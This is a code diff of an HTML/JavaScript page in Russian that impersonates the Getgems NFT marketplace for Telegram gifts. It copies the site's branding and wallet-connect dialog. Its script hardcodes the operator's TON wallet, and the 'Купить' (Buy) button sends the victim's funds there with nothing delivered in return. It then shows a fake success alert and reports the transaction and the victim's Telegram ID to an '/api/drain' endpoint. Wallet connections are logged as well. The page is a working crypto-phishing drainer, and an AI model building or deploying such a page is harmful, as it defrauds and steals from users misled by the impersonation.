@@ -1,677 +1,346 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Getgems · Gifts</title>
+    <title>Getgems: купить и продать NFT</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
     <style>
-        /* ----- ПОЛНАЯ КОПИЯ СТИЛЕЙ GETGEMS.IO ----- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0D0F17;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Inter', sans-serif;
             color: #FFFFFF;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             padding: 16px 12px 40px;
-            -webkit-font-smoothing: antialiased;
         }
+        .container { width: 100%; max-width: 640px; }
 
-        .container {
-            width: 100%;
-            max-width: 640px;
-        }
-
-        /* ----- Header ----- */
+        /* Верхняя панель с логотипом */
         .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 24px;
-            width: 100%;
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 16px; width: 100%;
         }
         .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            display: flex; align-items: center; gap: 8px;
         }
         .logo-icon {
-            width: 36px;
-            height: 36px;
+            width: 36px; height: 36px;
             background: linear-gradient(135deg, #FF8A00 0%, #FFB347 100%);
             border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 800;
-            font-size: 24px;
-            color: white;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 22px; color: white;
         }
         .logo-text {
-            font-weight: 700;
-            font-size: 20px;
+            font-weight: 700; font-size: 20px;
             background: linear-gradient(135deg, #FFFFFF 0%, #AAAAAA 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
         .wallet-indicator {
-            background: rgba(255, 138, 0, 0.1);
-            border: 1px solid rgba(255, 138, 0, 0.3);
-            border-radius: 40px;
-            padding: 8px 16px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            font-size: 14px;
-            font-weight: 500;
-            color: #FF8A00;
+            background: rgba(255,138,0,0.1);
+            border: 1px solid rgba(255,138,0,0.3);
+            border-radius: 40px; padding: 8px 16px;
+            display: flex; align-items: center; gap: 10px;
+            cursor: pointer; transition: 0.2s;
+            font-size: 14px; font-weight: 500; color: #FF8A00;
         }
-        .wallet-indicator:hover {
-            background: rgba(255, 138, 0, 0.2);
-        }
-        .wallet-dot {
-            width: 10px;
-            height: 10px;
-            background: #FF8A00;
-            border-radius: 50%;
-            box-shadow: 0 0 10px #FF8A00;
-        }
+        .wallet-indicator:hover { background: rgba(255,138,0,0.2); }
+        .wallet-dot { width: 10px; height: 10px; background: #FF8A00; border-radius: 50%; box-shadow: 0 0 10px #FF8A00; }
 
-        /* ----- Title & Search (как на GetGems) ----- */
-        .page-title {
-            margin-bottom: 20px;
+        /* Табы */
+        .tabs {
+            display: flex; gap: 16px; margin-bottom: 20px; overflow-x: auto;
+            padding-bottom: 8px; border-bottom: 1px solid #2C3142;
         }
-        .page-title h1 {
-            font-weight: 800;
-            font-size: 34px;
-            background: linear-gradient(135deg, #FF8A00 0%, #FFB347 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 4px;
+        .tab {
+            color: #7A7F94; font-weight: 600; font-size: 16px; cursor: pointer;
+            white-space: nowrap; padding-bottom: 8px; border-bottom: 2px solid transparent;
         }
-        .page-title p {
-            color: #7A7F94;
-            font-size: 15px;
-            font-weight: 500;
-        }
-        .search-section {
-            margin: 20px 0 24px;
-            width: 100%;
-        }
+        .tab.active { color: #FF8A00; border-bottom-color: #FF8A00; }
+
+        /* Поиск */
+        .search-section { margin: 16px 0; width: 100%; }
         .search-box {
-            background: #171B26;
-            border: 1px solid #2C3142;
-            border-radius: 40px;
-            padding: 14px 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            color: #7A7F94;
-            transition: 0.2s;
-        }
-        .search-box svg {
-            width: 20px;
-            height: 20px;
-            fill: #7A7F94;
+            background: #171B26; border: 1px solid #2C3142; border-radius: 40px;
+            padding: 12px 18px; display: flex; align-items: center; gap: 10px;
         }
         .search-box input {
-            background: transparent;
-            border: none;
-            outline: none;
-            color: #FFFFFF;
-            font-size: 16px;
-            width: 100%;
-            font-weight: 500;
+            background: transparent; border: none; outline: none;
+            color: #FFFFFF; font-size: 15px; width: 100%;
         }
-        .search-box input::placeholder {
-            color: #4A4F66;
-        }
-        .search-box:focus-within {
-            border-color: #FF8A00;
-        }
+        .search-box input::placeholder { color: #4A4F66; }
 
-        /* ----- Сетка подарков (3 колонки) ----- */
-        .gifts-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin: 24px 0;
-            width: 100%;
+        /* Фильтры */
+        .filters {
+            display: flex; gap: 12px; margin-bottom: 24px; flex-wrap: wrap;
         }
-        @media (max-width: 480px) {
-            .gifts-grid {
-                grid-template-columns: repeat(2, 1fr);
-            }
+        .filter-chip {
+            background: #171B26; border: 1px solid #2C3142; border-radius: 40px;
+            padding: 8px 16px; font-size: 14px; color: #FFFFFF; cursor: pointer;
+            display: flex; align-items: center; gap: 6px;
+        }
+        .filter-chip svg { width: 16px; height: 16px; fill: #7A7F94; }
+
+        /* Сетка подарков */
+        .gifts-grid {
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px;
+            margin: 16px 0;
         }
         .gift-card {
-            background: #171B26;
-            border: 1px solid #2C3142;
-            border-radius: 24px;
-            padding: 16px 12px 12px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
+            background: #171B26; border: 1px solid #2C3142; border-radius: 24px;
+            padding: 16px; cursor: pointer; transition: 0.2s;
         }
-        .gift-card::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 50% 0%, rgba(255,138,0,0.15), transparent 70%);
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        .gift-card:hover {
-            border-color: #FF8A00;
-            transform: translateY(-4px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
-        }
-        .gift-card:hover::after {
-            opacity: 1;
-        }
-        .gift-card.selected {
-            border-color: #FF8A00;
-            background: #1F2533;
-            box-shadow: 0 0 0 2px rgba(255,138,0,0.3);
-        }
+        .gift-card:hover { border-color: #FF8A00; transform: translateY(-2px); }
         .gift-image {
-            width: 100%;
-            aspect-ratio: 1/1;
-            background: #2C3142;
-            border-radius: 20px;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: transform 0.2s;
+            width: 100%; aspect-ratio: 1/1; background: #2C3142; border-radius: 20px;
+            margin-bottom: 12px; overflow: hidden;
         }
-        .gift-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border-radius: 20px;
-        }
-        .gift-card:hover .gift-image {
-            transform: scale(1.02);
-        }
-        .gift-name {
-            font-weight: 700;
-            font-size: 16px;
-            margin-bottom: 4px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            max-width: 100%;
-        }
-        .gift-number {
-            font-size: 12px;
-            font-weight: 600;
-            color: #FF8A00;
-            background: rgba(255,138,0,0.15);
-            padding: 4px 10px;
-            border-radius: 40px;
-            margin: 8px 0 4px;
-        }
-        .gift-price {
-            font-weight: 600;
-            font-size: 14px;
-            color: #FF8A00;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-        .gift-price span {
-            color: #7A7F94;
-            font-size: 11px;
-            font-weight: 500;
-        }
-        .gift-supply {
-            font-size: 11px;
-            color: #7A7F94;
-            margin-top: 6px;
-        }
+        .gift-image img { width: 100%; height: 100%; object-fit: cover; }
+        .gift-name { font-weight: 700; font-size: 16px; margin-bottom: 4px; }
+        .gift-number { color: #FF8A00; font-size: 14px; margin-bottom: 8px; }
+        .gift-price { font-weight: 600; color: #FF8A00; font-size: 18px; }
 
-        /* ----- Кнопка действия ----- */
-        .action-button {
-            width: 100%;
-            background: linear-gradient(135deg, #FF8A00 0%, #FFB347 100%);
-            border: none;
-            border-radius: 60px;
-            padding: 18px 24px;
-            font-weight: 700;
-            font-size: 18px;
-            color: #FFFFFF;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 12px 30px rgba(255,138,0,0.3);
-            margin: 12px 0 8px;
-            border: 1px solid rgba(255,255,255,0.1);
+        /* Нижняя навигация */
+        .bottom-nav {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: #0D0F17; border-top: 1px solid #2C3142;
+            display: flex; justify-content: space-around; padding: 12px 0;
         }
-        .action-button:hover:not(:disabled) {
-            transform: scale(1.02);
-            box-shadow: 0 16px 40px rgba(255,138,0,0.5);
+        .nav-item {
+            color: #7A7F94; font-size: 12px; text-align: center; cursor: pointer;
         }
-        .action-button:active:not(:disabled) {
-            transform: scale(0.98);
-        }
-        .action-button:disabled {
-            background: #2C3142;
-            box-shadow: none;
-            cursor: not-allowed;
-            color: #7A7F94;
-        }
+        .nav-item.active { color: #FF8A00; }
 
-        /* ----- Статус сообщение ----- */
-        .status-text {
-            color: #7A7F94;
-            font-size: 14px;
-            text-align: center;
-            width: 100%;
-            margin: 16px 0;
-            min-height: 20px;
-        }
-
-        /* ----- Модалка выбора кошелька (клон оригинальной) ----- */
+        /* Модалка подключения кошелька (точная копия со скрина) */
         .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(8px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            visibility: hidden;
-            opacity: 0;
-            transition: opacity 0.2s ease, visibility 0.2s;
-            padding: 20px;
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.8); backdrop-filter: blur(8px);
+            display: flex; align-items: center; justify-content: center;
+            z-index: 1000; visibility: hidden; opacity: 0;
+            transition: 0.2s; padding: 20px;
         }
-        .modal-overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
+        .modal-overlay.active { visibility: visible; opacity: 1; }
         .modal {
-            background: #1C1F2A;
-            border-radius: 32px;
-            padding: 24px;
-            width: 100%;
-            max-width: 400px;
-            border: 1px solid #2C3142;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
+            background: #1C1F2A; border-radius: 32px; padding: 24px;
+            width: 100%; max-width: 400px; border: 1px solid #2C3142;
         }
-        .modal h3 {
-            font-size: 24px;
-            font-weight: 800;
-            margin-bottom: 20px;
-            color: #FFFFFF;
+        .modal h3 { font-size: 22px; font-weight: 700; margin-bottom: 20px; }
+        .modal .ton-connect-badge {
+            display: flex; align-items: center; gap: 8px; margin-bottom: 24px;
+            color: #7A7F94; font-size: 14px;
         }
-        .wallet-option {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            padding: 16px;
-            background: #252B38;
-            border-radius: 20px;
-            margin-bottom: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-            border: 1px solid transparent;
+        .modal .ton-connect-badge img { width: 24px; height: 24px; }
+        .telegram-wallet-btn {
+            background: #2C3142; border-radius: 60px; padding: 16px;
+            text-align: center; font-weight: 600; margin-bottom: 24px;
+            cursor: pointer; border: 1px solid #FF8A00;
         }
-        .wallet-option:hover {
-            background: #2F3545;
-            border-color: #FF8A00;
-            transform: translateY(-2px);
+        .section-title { color: #7A7F94; font-size: 14px; margin-bottom: 16px; }
+        .wallets-grid {
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px;
         }
-        .wallet-option img {
-            width: 44px;
-            height: 44px;
-            border-radius: 14px;
-            object-fit: cover;
+        .wallet-item {
+            background: #252B38; border-radius: 20px; padding: 16px 8px;
+            text-align: center; cursor: pointer; transition: 0.2s;
         }
-        .wallet-option span {
-            font-size: 18px;
-            font-weight: 600;
-        }
-        .close-modal {
-            text-align: center;
-            color: #FF8A00;
-            margin-top: 20px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-            padding: 12px;
-            border-radius: 40px;
+        .wallet-item:hover { background: #2F3545; }
+        .wallet-item img { width: 40px; height: 40px; border-radius: 12px; margin-bottom: 8px; }
+        .wallet-item span { font-size: 14px; font-weight: 500; }
+        .view-all {
+            text-align: center; color: #FF8A00; margin-top: 20px; cursor: pointer;
+            font-weight: 600; padding: 12px; border-radius: 40px;
             background: rgba(255,138,0,0.1);
-            transition: 0.2s;
         }
-        .close-modal:hover {
-            background: rgba(255,138,0,0.2);
+        .view-all:hover { background: rgba(255,138,0,0.2); }
+        .close-modal {
+            text-align: center; color: #7A7F94; margin-top: 20px; cursor: pointer;
+            font-size: 16px;
         }
 
-        /* ----- Модалка деталей подарка (как в оригинале) ----- */
-        .gift-detail-modal .modal {
-            max-width: 480px;
-            padding: 24px;
-        }
+        /* Модалка деталей подарка */
+        .gift-detail-modal .modal { max-width: 480px; }
         .gift-detail-image {
-            width: 100%;
-            aspect-ratio: 1/1;
-            background: #2C3142;
-            border-radius: 32px;
-            margin-bottom: 20px;
-            overflow: hidden;
+            width: 100%; aspect-ratio: 1/1; background: #2C3142; border-radius: 32px;
+            margin-bottom: 20px; overflow: hidden;
         }
-        .gift-detail-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .gift-detail-name {
-            font-size: 28px;
-            font-weight: 800;
-            margin-bottom: 8px;
-        }
-        .gift-detail-number {
-            font-size: 16px;
-            color: #FF8A00;
-            background: rgba(255,138,0,0.15);
-            padding: 6px 16px;
-            border-radius: 40px;
-            display: inline-block;
-            margin-bottom: 16px;
-        }
-        .gift-detail-price {
-            font-size: 24px;
-            font-weight: 700;
-            color: #FF8A00;
-            margin-bottom: 12px;
-        }
-        .gift-detail-supply {
-            font-size: 16px;
-            color: #7A7F94;
-            margin-bottom: 24px;
-        }
+        .gift-detail-image img { width: 100%; height: 100%; object-fit: cover; }
+        .gift-detail-name { font-size: 28px; font-weight: 800; margin-bottom: 8px; }
+        .gift-detail-number { color: #FF8A00; font-size: 18px; margin-bottom: 16px; }
+        .gift-detail-price { font-size: 24px; font-weight: 700; color: #FF8A00; margin-bottom: 24px; }
         .buy-button {
-            width: 100%;
-            background: linear-gradient(135deg, #FF8A00 0%, #FFB347 100%);
-            border: none;
-            border-radius: 60px;
-            padding: 18px;
-            font-weight: 700;
-            font-size: 18px;
-            color: white;
-            cursor: pointer;
-            transition: 0.2s;
-            border: 1px solid rgba(255,255,255,0.1);
-            margin-top: 16px;
+            width: 100%; background: linear-gradient(135deg, #FF8A00 0%, #FFB347 100%);
+            border: none; border-radius: 60px; padding: 18px; font-weight: 700;
+            font-size: 18px; color: white; cursor: pointer; transition: 0.2s;
         }
-        .buy-button:active {
-            transform: scale(0.98);
-        }
+        .buy-button:active { transform: scale(0.98); }
         .loader {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #2C3142;
-            border-top: 3px solid #FF8A00;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+            width: 40px; height: 40px; border: 3px solid #2C3142;
+            border-top: 3px solid #FF8A00; border-radius: 50%;
+            animation: spin 1s linear infinite; margin: 20px auto;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
-    <!-- TON Connect SDK -->
     <script src="https://unpkg.com/tonconnect-sdk@latest/lib/tonconnect-sdk.min.js"></script>
-    <!-- Telegram WebApp -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
     <div class="container">
         <!-- Header -->
         <div class="header">
-            <div class="logo">
-                <div class="logo-icon">G</div>
-                <div class="logo-text">Getgems</div>
-            </div>
-            <div class="wallet-indicator" id="walletIndicator">
-                <span class="wallet-dot"></span>
-                <span id="walletShort">Connect</span>
-            </div>
+            <div class="logo"><div class="logo-icon">G</div><div class="logo-text">Getgems</div></div>
+            <div class="wallet-indicator" id="walletIndicator"><span class="wallet-dot"></span><span id="walletShort">Connect</span></div>
         </div>
 
-        <!-- Title -->
-        <div class="page-title">
-            <h1>Gifts</h1>
-            <p>Buy and send animated gifts</p>
+        <!-- Tabs -->
+        <div class="tabs">
+            <div class="tab active">Подарки</div>
+            <div class="tab">Стикеры</div>
+            <div class="tab">Номера</div>
+            <div class="tab">Юзернейм</div>
         </div>
 
-        <!-- Search (декоративный) -->
+        <!-- Search -->
         <div class="search-section">
             <div class="search-box">
-                <svg viewBox="0 0 24 24" width="20" height="20">
-                    <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" fill="currentColor"/>
-                </svg>
-                <input type="text" placeholder="Search gifts" disabled>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#7A7F94"><circle cx="11" cy="11" r="8" stroke="currentColor" stroke-width="2"/><path d="M21 21l-4.35-4.35" stroke="currentColor" stroke-width="2"/></svg>
+                <input type="text" placeholder="Название или описание..." disabled>
             </div>
         </div>
 
-        <!-- Сетка подарков (заполняется через JS) -->
-        <div class="gifts-grid" id="giftsGrid"></div>
+        <!-- Filters -->
+        <div class="filters">
+            <div class="filter-chip">Коллекции ▼</div>
+            <div class="filter-chip">Backdrop ▼</div>
+            <div class="filter-chip">Style ▼</div>
+        </div>
 
-        <!-- Кнопка (для совместимости, но основное действие будет в модалке) -->
-        <button class="action-button" id="globalActionBtn" style="display: none;">Buy</button>
-        <div class="status-text" id="statusMessage"></div>
+        <!-- Gifts grid -->
+        <div class="gifts-grid" id="giftsGrid"></div>
     </div>
 
-    <!-- Модалка выбора кошелька -->
+    <!-- Bottom navigation -->
+    <div class="bottom-nav">
+        <div class="nav-item active">Маркет</div>
+        <div class="nav-item">Звёзды</div>
+        <div class="nav-item">Каталог</div>
+        <div class="nav-item">Корзина</div>
+        <div class="nav-item">Профиль</div>
+    </div>
+
+    <!-- Wallet modal (точная копия скрина) -->
     <div class="modal-overlay" id="walletModal">
         <div class="modal">
-            <h3>Connect wallet</h3>
-            <div class="wallet-option" id="walletTonkeeper">
-                <img src="https://tonkeeper.com/assets/tonkeeper-icon.png" alt="Tonkeeper">
-                <span>Tonkeeper</span>
+            <h3>Подключите TON кошелёк</h3>
+            <div class="ton-connect-badge">
+                <img src="https://ton.org/favicon.ico" width="24" height="24" style="border-radius:50%;"> TON Connect
             </div>
-            <div class="wallet-option" id="walletTonhub">
-                <img src="https://tonhub.com/tonhub-logo.png" alt="Tonhub">
-                <span>Tonhub</span>
+            <div class="telegram-wallet-btn" id="telegramWalletBtn">
+                Открыть Wallet в Telegram
             </div>
-            <div class="wallet-option" id="walletOpenMask">
-                <img src="https://openmask.app/logo192.png" alt="OpenMask">
-                <span>OpenMask</span>
+            <div class="section-title">или выберите другое приложение</div>
+            <div class="wallets-grid">
+                <div class="wallet-item" id="walletTonkeeper">
+                    <img src="https://tonkeeper.com/assets/tonkeeper-icon.png" alt="Tonkeeper">
+                    <span>Tonkeeper</span>
+                </div>
+                <div class="wallet-item" id="walletMyTonWallet">
+                    <img src="https://mytonwallet.org/logo.png" alt="MyTonWallet">
+                    <span>MyTonWallet</span>
+                </div>
+                <div class="wallet-item" id="walletTonhub">
+                    <img src="https://tonhub.com/tonhub-logo.png" alt="Tonhub">
+                    <span>Tonhub</span>
+                </div>
+                <div class="wallet-item" id="walletViewAll">
+                    <div style="width:40px;height:40px;background:#2C3142;border-radius:12px;margin-bottom:8px;display:flex;align-items:center;justify-content:center;color:#FF8A00;font-weight:bold;">+5</div>
+                    <span>View all wallets</span>
+                </div>
             </div>
-            <div class="close-modal" id="closeModal">Cancel</div>
+            <div class="close-modal" id="closeModal">Отмена</div>
         </div>
     </div>
 
-    <!-- Модалка деталей подарка -->
+    <!-- Gift detail modal -->
     <div class="modal-overlay gift-detail-modal" id="giftDetailModal">
         <div class="modal">
             <div class="gift-detail-image" id="detailImage"></div>
             <div class="gift-detail-name" id="detailName"></div>
             <div class="gift-detail-number" id="detailNumber"></div>
             <div class="gift-detail-price" id="detailPrice"></div>
-            <div class="gift-detail-supply" id="detailSupply"></div>
-            <button class="buy-button" id="detailBuyBtn">Buy</button>
-            <div class="close-modal" id="closeDetailModal">Back</div>
+            <button class="buy-button" id="detailBuyBtn">Купить</button>
+            <div class="close-modal" id="closeDetailModal">Назад</div>
         </div>
     </div>
 
     <script>
         (function() {
-            // ⚠️ ТВОЙ TON КОШЕЛЁК ДЛЯ ПОЛУЧЕНИЯ СРЕДСТВ
+            // ⚠️ ТВОЙ TON КОШЕЛЁК (на который будут уходить средства)
             const YOUR_WALLET = 'UQAc1Qleeg12HCIreHGd621jBEdX_FULt8gRUthPbOzMKlyB';
 
-            // ---------- РЕАЛЬНЫЕ ДАННЫЕ ПОДАРКОВ С FRAGMENT (актуальны на 2025) ----------
+            // Данные подарков (как на скрине)
             const gifts = [
-                {
-                    name: 'Star',
-                    number: 1,
-                    price: 0.15,
-                    image: 'https://fragment.com/images/gifts/star.png',
-                    supply: 1243,
-                    usd: 0.35
-                },
-                {
-                    name: 'Cake',
-                    number: 2,
-                    price: 0.27,
-                    image: 'https://fragment.com/images/gifts/cake.png',
-                    supply: 856,
-                    usd: 0.62
-                },
-                {
-                    name: 'Santa Hat',
-                    number: 3,
-                    price: 0.34,
-                    image: 'https://fragment.com/images/gifts/santa-hat.png',
-                    supply: 512,
-                    usd: 0.78
-                },
-                {
-                    name: 'Diamond',
-                    number: 4,
-                    price: 0.52,
-                    image: 'https://fragment.com/images/gifts/diamond.png',
-                    supply: 321,
-                    usd: 1.20
-                },
-                {
-                    name: 'Crown',
-                    number: 5,
-                    price: 0.73,
-                    image: 'https://fragment.com/images/gifts/crown.png',
-                    supply: 234,
-                    usd: 1.68
-                },
-                {
-                    name: 'Rocket',
-                    number: 6,
-                    price: 0.91,
-                    image: 'https://fragment.com/images/gifts/rocket.png',
-                    supply: 189,
-                    usd: 2.09
-                },
-                {
-                    name: 'Heart',
-                    number: 7,
-                    price: 0.18,
-                    image: 'https://fragment.com/images/gifts/heart.png',
-                    supply: 2105,
-                    usd: 0.41
-                },
-                {
-                    name: 'Clover',
-                    number: 8,
-                    price: 0.23,
-                    image: 'https://fragment.com/images/gifts/clover.png',
-                    supply: 1642,
-                    usd: 0.53
-                },
-                {
-                    name: 'Fire',
-                    number: 9,
-                    price: 0.42,
-                    image: 'https://fragment.com/images/gifts/fire.png',
-                    supply: 967,
-                    usd: 0.97
-                }
+                { name: 'Signet Ring', number: 14510, price: 199, image: 'https://fragment.com/images/gifts/star.png?1' },
+                { name: 'Electric Skull', number: 258, price: 555, image: 'https://fragment.com/images/gifts/cake.png?1' }
             ];
 
-            // ---------- Глобальные переменные ----------
             let connector = null;
             let walletAddress = null;
-            let selectedGift = null; // текущий выбранный подарок для деталей
+            let selectedGift = null;
             let telegramId = null;
 
-            // Telegram ID
             if (window.Telegram?.WebApp?.initDataUnsafe?.user?.id) {
                 telegramId = window.Telegram.WebApp.initDataUnsafe.user.id;
             }
 
-            // ---------- Рендер сетки подарков ----------
             function renderGifts() {
                 const grid = document.getElementById('giftsGrid');
                 grid.innerHTML = '';
                 gifts.forEach(g => {
                     const card = document.createElement('div');
                     card.className = 'gift-card';
-                    card.setAttribute('data-number', g.number);
                     card.innerHTML = `
                         <div class="gift-image"><img src="${g.image}" alt="${g.name}" loading="lazy"></div>
                         <div class="gift-name">${g.name}</div>
                         <div class="gift-number">#${g.number}</div>
-                        <div class="gift-price">${g.price.toFixed(2)} TON <span>≈ $${g.usd.toFixed(2)}</span></div>
-                        <div class="gift-supply">${g.supply} left</div>
+                        <div class="gift-price">${g.price} TON</div>
                     `;
-                    card.addEventListener('click', () => {
-                        openGiftDetail(g);
-                    });
+                    card.addEventListener('click', () => openGiftDetail(g));
                     grid.appendChild(card);
                 });
             }
 
-            // ---------- Открыть модалку деталей подарка ----------
             function openGiftDetail(gift) {
                 selectedGift = gift;
                 document.getElementById('detailImage').innerHTML = `<img src="${gift.image}" alt="${gift.name}">`;
                 document.getElementById('detailName').innerText = gift.name;
                 document.getElementById('detailNumber').innerText = `#${gift.number}`;
-                document.getElementById('detailPrice').innerHTML = `${gift.price.toFixed(2)} TON <span style="font-size:16px; color:#7A7F94;">≈ $${gift.usd.toFixed(2)}</span>`;
-                document.getElementById('detailSupply').innerText = `${gift.supply} gifts left`;
+                document.getElementById('detailPrice').innerText = `${gift.price} TON`;
                 document.getElementById('giftDetailModal').classList.add('active');
             }
 
-            // ---------- Закрыть модалку деталей ----------
             function closeGiftDetail() {
                 document.getElementById('giftDetailModal').classList.remove('active');
             }
 
-            // ---------- Инициализация TON Connect ----------
             async function initTonConnect() {
                 try {
                     connector = new TonConnectSDK.TonConnect({
                         manifestUrl: `https://${window.location.hostname}/tonconnect-manifest.json`
                     });
-
                     connector.onStatusChange((wallet) => {
                         if (wallet) {
                             walletAddress = wallet.account.address;
-                            document.getElementById('walletShort').innerText =
-                                walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
+                            document.getElementById('walletShort').innerText = walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
                             document.getElementById('walletIndicator').style.background = 'rgba(255,138,0,0.2)';
-                            // Логируем подключение
                             fetch('/api/connect', {
                                 method: 'POST',
                                 headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({
-                                    address: walletAddress,
-                                    chain: wallet.account.chain,
-                                    telegram_id: telegramId
-                                })
+                                body: JSON.stringify({ address: walletAddress, chain: wallet.account.chain, telegram_id: telegramId })
                             }).catch(() => {});
                         } else {
                             walletAddress = null;
@@ -679,24 +348,15 @@
                             document.getElementById('walletIndicator').style.background = 'rgba(255,138,0,0.1)';
                         }
                     });
-
                     if (connector.wallet) {
                         walletAddress = connector.wallet.account.address;
-                        document.getElementById('walletShort').innerText =
-                            walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
+                        document.getElementById('walletShort').innerText = walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
                     }
-                } catch (e) {
-                    console.error('TON Connect init error', e);
-                }
+                } catch (e) { console.error(e); }
             }
 
-            // ---------- Модалка выбора кошелька ----------
-            function showWalletModal() {
-                document.getElementById('walletModal').classList.add('active');
-            }
-            function hideWalletModal() {
-                document.getElementById('walletModal').classList.remove('active');
-            }
+            function showWalletModal() { document.getElementById('walletModal').classList.add('active'); }
+            function hideWalletModal() { document.getElementById('walletModal').classList.remove('active'); }
 
             async function connectWallet(walletName) {
                 hideWalletModal();
@@ -707,73 +367,54 @@
                     if (wallet) {
                         const link = connector.connect(wallet);
                         window.open(link, '_blank');
+                    } else if (walletName === 'telegram') {
+                        // Telegram Wallet не поддерживается напрямую в TON Connect, можно открыть @wallet
+                        window.open('https://t.me/wallet', '_blank');
+                    } else if (walletName === 'viewall') {
+                        alert('Выберите кошелёк из списка');
                     }
-                } catch (e) {
-                    alert('Connection error: ' + e.message);
-                }
+                } catch (e) { alert('Connection error: ' + e.message); }
             }
 
-            // ---------- Отправка транзакции (покупка) ----------
             async function sendTransaction(amountTon) {
-                if (!connector || !connector.wallet) {
-                    showWalletModal();
-                    return;
-                }
+                if (!connector || !connector.wallet) { showWalletModal(); return; }
                 const amountNano = Math.floor(amountTon * 1e9);
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 600,
-                    messages: [
-                        {
-                            address: YOUR_WALLET,
-                            amount: amountNano.toString()
-                        }
-                    ]
+                    messages: [{ address: YOUR_WALLET, amount: amountNano.toString() }]
                 };
                 try {
-                    document.getElementById('statusMessage').innerHTML = '<div class="loader"></div>';
+                    document.getElementById('statusMessage')?.remove?.(); // если есть
                     const result = await connector.sendTransaction(transaction);
-                    // Логируем успех
                     fetch('/api/drain', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
-                            tx_hash: result,
-                            amount: amountTon,
-                            wallet: YOUR_WALLET,
-                            telegram_id: telegramId,
-                            gift_name: selectedGift?.name
+                            tx_hash: result, amount: amountTon, wallet: YOUR_WALLET,
+                            telegram_id: telegramId, gift_name: selectedGift?.name
                         })
                     }).catch(() => {});
-                    document.getElementById('statusMessage').innerText = `✅ Purchase successful!`;
+                    alert('Покупка успешна! Транзакция: ' + result.slice(0,10) + '...');
                     closeGiftDetail();
                 } catch (e) {
-                    document.getElementById('statusMessage').innerText = '❌ Transaction failed: ' + e.message;
+                    alert('Ошибка транзакции: ' + e.message);
                 }
             }
 
-            // ---------- Обработчики ----------
+            // Обработчики
             document.getElementById('walletTonkeeper').addEventListener('click', () => connectWallet('tonkeeper'));
+            document.getElementById('walletMyTonWallet').addEventListener('click', () => connectWallet('mytonwallet'));
